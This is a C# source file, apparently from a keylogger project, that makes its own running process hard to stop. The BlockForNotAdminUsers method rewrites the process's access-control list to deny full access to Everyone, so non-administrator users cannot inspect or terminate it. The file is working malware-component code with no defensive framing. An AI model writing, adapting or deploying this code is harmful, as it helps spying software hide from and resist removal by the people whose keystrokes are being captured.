using KeyLogger.Enums;
using System;
using System.ComponentModel;
using System.Diagnostics;
using System.Security.AccessControl;
using System.Security.Principal;
using static KeyLogger.WinApis.AdvApi32;

namespace KeyLogger.Services
{
	internal class ProcessAccessService
	{
		const int DACL_SECURITY_INFORMATION = 0x00000004;

		private RawSecurityDescriptor GetProcessSecurityDescriptor(IntPtr processHandle)
		{
			var psd = new byte[0];
			GetKernelObjectSecurity(processHandle, DACL_SECURITY_INFORMATION, psd, 0, out uint bufSizeNeeded);
			if (bufSizeNeeded < 0 || bufSizeNeeded > short.MaxValue)
				throw new Win32Exception();
			if (!GetKernelObjectSecurity(
				 processHandle,
				 DACL_SECURITY_INFORMATION,
				 psd = new byte[bufSizeNeeded],
				 bufSizeNeeded,
				 out bufSizeNeeded))
				throw new Win32Exception();
			return new RawSecurityDescriptor(psd, 0);
		}

		private void SetProcessSecurityDescriptor(IntPtr processHandle, RawSecurityDescriptor securityDescriptor)
		{			
			var rawsd = new byte[securityDescriptor.BinaryLength];
			securityDescriptor.GetBinaryForm(rawsd, 0);
			if (!SetKernelObjectSecurity(processHandle, DACL_SECURITY_INFORMATION, rawsd))
				throw new Win32Exception();
		}

		internal void BlockForNotAdminUsers()
		{
			var hProcess = Process.GetCurrentProcess().Handle;
			var securityDescriptor = GetProcessSecurityDescriptor(hProcess);
			var sid = WindowsIdentity.GetCurrent().User.AccountDomainSid;

			securityDescriptor.DiscretionaryAcl.InsertAce(
				 0,
				 new CommonAce(
					  AceFlags.None,
					  AceQualifier.AccessDenied,
					  (int)ProcessAccessRights.PROCESS_ALL_ACCESS,
					  new SecurityIdentifier(WellKnownSidType.WorldSid, sid),
					  false,
					  null));

			SetProcessSecurityDescriptor(hProcess, securityDescriptor);
		}
	}
}
